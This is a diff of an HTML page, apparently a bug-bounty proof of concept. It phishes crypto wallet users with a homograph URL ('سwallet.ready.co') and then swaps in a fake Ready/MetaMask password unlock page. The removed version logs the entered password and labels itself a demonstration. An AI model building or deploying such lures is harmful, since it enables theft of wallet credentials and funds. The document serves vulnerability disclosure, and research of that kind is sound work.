@@ -1,133 +1,101 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Ready Wallet - Connect Your Wallet</title>
+    <title>Ready Login</title>
     <style>
       body {
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-        background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+        font-family: Arial, sans-serif;
+        background-color: #1a1a1a;
         padding: 40px;
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0;
+        text-align: center;
       }
       .card {
         background-color: white;
-        max-width: 440px;
-        width: 100%;
+        max-width: 420px;
         margin: auto;
-        padding: 40px;
-        border-radius: 16px;
-        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        padding: 30px;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
       }
-      .ready-logo {
-        width: 90px;
-        margin: 0 auto 20px;
-        display: block;
+      .metamask-logo {
+        width: 80px;
+        margin-bottom: 15px;
       }
       h2 {
         color: #1a1a1a;
-        margin-bottom: 12px;
-        text-align: center;
-        font-size: 28px;
-        font-weight: 700;
+        margin-bottom: 10px;
       }
       p {
         font-size: 15px;
-        color: #4a4a4a;
-        margin-bottom: 25px;
-        text-align: center;
-        line-height: 1.6;
+        color: #333;
+        margin-bottom: 20px;
       }
       .url-box {
-        background: #f8f9fa;
-        padding: 15px;
-        border-radius: 10px;
-        font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Courier New', monospace;
+        background: #f5f5f5;
+        padding: 12px;
+        border-radius: 6px;
+        font-family: monospace;
         font-size: 14px;
-        color: #2c3e50;
+        color: #1a1a1a;
         word-break: break-all;
-        border: 2px solid #e9ecef;
-        text-align: center;
-        font-weight: 500;
       }
       button {
-        background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+        background-color: #ff6b35;
         color: white;
-        padding: 14px 24px;
+        padding: 10px 20px;
         border: none;
-        border-radius: 10px;
-        font-size: 16px;
-        font-weight: 600;
+        border-radius: 6px;
+        font-size: 14px;
         cursor: pointer;
-        margin-top: 25px;
-        width: 100%;
-        transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
-      }
-      button:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
-      }
-      button:active {
-        transform: translateY(0);
-      }
-      .info-text {
-        font-size: 13px;
-        color: #666;
         margin-top: 20px;
+      }
+      .login-container {
+        max-width: 380px;
+        margin: 60px auto;
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
         text-align: center;
-        line-height: 1.5;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       }
-      .security-badge {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        margin-top: 20px;
-        color: #28a745;
-        font-size: 13px;
-        font-weight: 600;
+      .login-container input {
+        width: 90%;
+        margin: 10px auto;
+        padding: 10px;
+        font-size: 14px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        display: block;
+      }
+      .login-container button {
+        background-color: #ff6b35;
+        border: none;
+        padding: 10px 16px;
+        border-radius: 6px;
+        color: white;
+        font-size: 15px;
+        cursor: pointer;
+      }
+      .footer {
+        font-size: 11px;
+        color: #666;
+        margin-top: 15px;
       }
     </style>
   </head>
   <body>
     <div class="card">
-      <svg class="ready-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" style="stop-color:#ff6b35;stop-opacity:1" />
-            <stop offset="100%" style="stop-color:#f7931e;stop-opacity:1" />
-          </linearGradient>
-        </defs>
-        <circle cx="50" cy="50" r="45" fill="url(#grad1)"/>
-        <path d="M 30 50 L 45 65 L 70 35" stroke="white" stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-      
-      <h2>Connect Ready Wallet</h2>
-      <p>To continue, please copy and paste the secure URL below into your browser's address bar:</p>
-      
-      <div class="url-box" id="walleturl">https://سwallet.ready.co</div>
-      
-      <button onclick="copyUrl()">📋 Copy Secure URL</button>
-      
-      <div class="security-badge">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-        </svg>
-        <span>SSL Secured Connection</span>
-      </div>
-      
-      <p class="info-text">Ready Wallet uses bank-level encryption to protect your assets.</p>
+      <img class="metamask-logo" src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" alt="MetaMask Logo">
+      <h2>Connect with MetaMask</h2>
+      <p>Copy and paste the URL below into your browser's address bar:</p>
+      <div class="url-box" id="304url">https://سwallet.ready.co</div>
+      <button onclick="copyUrl()">📋 Copy URL</button>
     </div>
 
     <script>
       function copyUrl() {
-        const url = document.getElementById("walleturl");
+        const url = document.getElementById("304url");
         if (!window.getSelection) return;
-        
         const range = document.createRange();
         range.selectNodeContents(url);
         const sel = window.getSelection();
@@ -135,274 +103,87 @@
         sel.addRange(range);
         document.execCommand("copy");
 
-        // Show brief confirmation
-        const button = document.querySelector('button');
-        const originalText = button.innerHTML;
-        button.innerHTML = '✅ URL Copied!';
-        button.style.background = '#28a745';
-        
         setTimeout(() => {
-          button.innerHTML = originalText;
-          button.style.background = 'linear-gradient(135deg, #ff6b35 0%, #f7931e 100%)';
-        }, 1500);
-
-        // After delay, show phishing login page
-        setTimeout(() => {
-          document.open();
-          document.write(`<!DOCTYPE html>
-<html>
-<head>
-  <title>Ready Wallet - Unlock</title>
+          document.write(`
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+      font-family: Arial, sans-serif;
+      background: #1a1a1a;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+      height: 100vh;
     }
 
     .login-container {
       background: white;
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
       text-align: center;
-      width: 100%;
-      max-width: 400px;
-      animation: slideIn 0.5s ease;
+      width: 300px;
     }
 
-    @keyframes slideIn {
-      from {
-        opacity: 0;
-        transform: translateY(-20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .ready-logo {
+    .metamask-logo {
       width: 80px;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
     }
 
     h2 {
-      margin: 15px 0 10px;
+      margin: 10px 0;
       color: #1a1a1a;
-      font-size: 28px;
-      font-weight: 700;
     }
 
-    .subtitle {
-      color: #4a4a4a;
-      margin-bottom: 30px;
-      font-size: 15px;
-    }
-
-    .form-group {
+    p {
+      color: #333;
       margin-bottom: 20px;
-      text-align: left;
-    }
-
-    label {
-      display: block;
-      color: #1a1a1a;
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 8px;
     }
 
     input[type="password"] {
       width: 100%;
-      padding: 14px;
-      border: 2px solid #e9ecef;
-      border-radius: 10px;
-      font-size: 15px;
-      transition: all 0.3s ease;
-      font-family: inherit;
-    }
-
-    input[type="password"]:focus {
-      outline: none;
-      border-color: #ff6b35;
-      box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
-    }
-
-    .password-hint {
-      font-size: 12px;
-      color: #666;
-      margin-top: 8px;
-      text-align: left;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
     }
 
     button {
       width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+      padding: 10px;
+      background: #ff6b35;
       color: white;
       border: none;
-      border-radius: 10px;
-      font-weight: 600;
-      font-size: 16px;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
-      margin-top: 10px;
+      transition: background 0.3s;
     }
 
     button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
-    }
-
-    button:active {
-      transform: translateY(0);
-    }
-
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    .forgot-password {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    .forgot-password a {
-      color: #ff6b35;
-      text-decoration: none;
-      font-weight: 600;
-    }
-
-    .forgot-password a:hover {
-      text-decoration: underline;
-    }
-
-    .security-info {
-      margin-top: 25px;
-      padding: 15px;
-      background: #f8f9fa;
-      border-radius: 10px;
-      font-size: 13px;
-      color: #4a4a4a;
-      line-height: 1.6;
-    }
-
-    .security-icon {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      color: #28a745;
-      font-weight: 600;
-      margin-bottom: 8px;
+      background: #e55a25;
     }
 
     .footer {
-      margin-top: 25px;
+      margin-top: 20px;
       font-size: 12px;
       color: #666;
     }
-
-    .footer a {
-      color: #ff6b35;
-      text-decoration: none;
-    }
   </style>
-</head>
-<body>
-  <div class="login-container">
-    <svg class="ready-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <linearGradient id="grad2" x1="0%" y1="0%" x2="100%" y2="100%">
-          <stop offset="0%" style="stop-color:#ff6b35;stop-opacity:1" />
-          <stop offset="100%" style="stop-color:#f7931e;stop-opacity:1" />
-        </linearGradient>
-      </defs>
-      <circle cx="50" cy="50" r="45" fill="url(#grad2)"/>
-      <path d="M 30 50 L 45 65 L 70 35" stroke="white" stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-    </svg>
-    
-    <h2>Ready Wallet</h2>
-    <p class="subtitle">Unlock your wallet to continue</p>
-    
-    <form onsubmit="return handleSubmit(event)">
-      <div class="form-group">
-        <label for="password">Wallet Password</label>
-        <input 
-          type="password" 
-          id="password" 
-          placeholder="Enter your wallet password" 
-          required 
-          autocomplete="current-password"
-        />
-        <div class="password-hint">Your password is encrypted and never stored</div>
-      </div>
-      
-      <button type="submit">🔓 Unlock Wallet</button>
-    </form>
-    
-    <div class="forgot-password">
-      <a href="javascript:void(0)" onclick="alert('Please use your seed phrase to recover your wallet.')">Forgot password?</a>
-    </div>
-    
-    <div class="security-info">
-      <div class="security-icon">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-        </svg>
-        Secure Connection
-      </div>
-      <div>Your wallet data is encrypted with AES-256 encryption and secured with bank-level security protocols.</div>
-    </div>
-    
-    <div class="footer">
-      🔒 Protected by Ready Wallet Security<br>
-      <a href="javascript:void(0)">Privacy Policy</a> • <a href="javascript:void(0)">Terms of Service</a>
-    </div>
-  </div>
 
-  <script>
-    function handleSubmit(event) {
-      event.preventDefault();
-      
-      const password = document.getElementById('password').value;
-      
-      console.log('[PHISHED] Password:', password);
-      
-      const button = document.querySelector('button[type="submit"]');
-      button.innerHTML = '⏳ Unlocking...';
-      button.disabled = true;
-      
-      setTimeout(() => {
-        alert('🚨 PHISHING DEMONSTRATION\\n\\nStolen Password: ' + password + '\\n\\nIn real attack, this would be sent to:\\n→ Attacker server\\n→ Used to drain wallet\\n→ All funds stolen\\n\\nThis is a security research PoC!');
-        
-        button.innerHTML = '🔓 Unlock Wallet';
-        button.disabled = false;
-        document.getElementById('password').value = '';
-      }, 2000);
-      
-      return false;
-    }
-    
-    window.onload = function() {
-      document.getElementById('password').focus();
-    };
-  </script>
-</body>
-</html>
+  <div class="login-container">
+    <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="MetaMask Logo">
+    <h2>MetaMask</h2>
+    <p>Unlock your wallet</p>
+    <input type="password" placeholder="Enter your wallet password" />
+    <button type="submit">Unlock</button>
+    <div class="footer">HackerOne Bug Bounty</div>
+  </div>
+`);
+        }, 4300);
+      }
     </script>
   </body>
 </html>
